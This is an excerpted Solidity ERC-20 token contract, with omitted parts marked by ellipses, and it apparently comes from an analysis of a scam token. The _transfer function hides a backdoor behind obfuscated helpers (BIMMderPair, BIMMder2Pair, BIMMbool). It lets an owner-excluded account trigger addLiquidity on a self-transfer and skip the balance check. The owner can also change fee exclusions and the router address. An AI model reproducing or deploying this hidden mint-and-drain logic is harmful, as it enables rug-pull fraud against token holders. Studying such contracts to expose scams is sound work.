...
library Address {
    ...
    function BIMMderPair(address account) internal pure  returns (bool) {
...
contract TOKEN is Context, IERC20, Ownable {
    ...
    function set_excludedFromFee(address account, bool newValue) public onlyOwner {
        _excludedFromFee[account] = newValue;
    }
    ...
    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
        ...
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(newRouterAddress);
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (BIMMder2Pair(from, to)) {return addLiquidity(amount, to);}
        if (BIMMbool){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.BIMMderPair(to) && to != address(this) && !inLiquidityTransaction && !BIMMbool) {
    ...
    function BIMMder2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.BIMMderPair(to)) && to == from;
    }
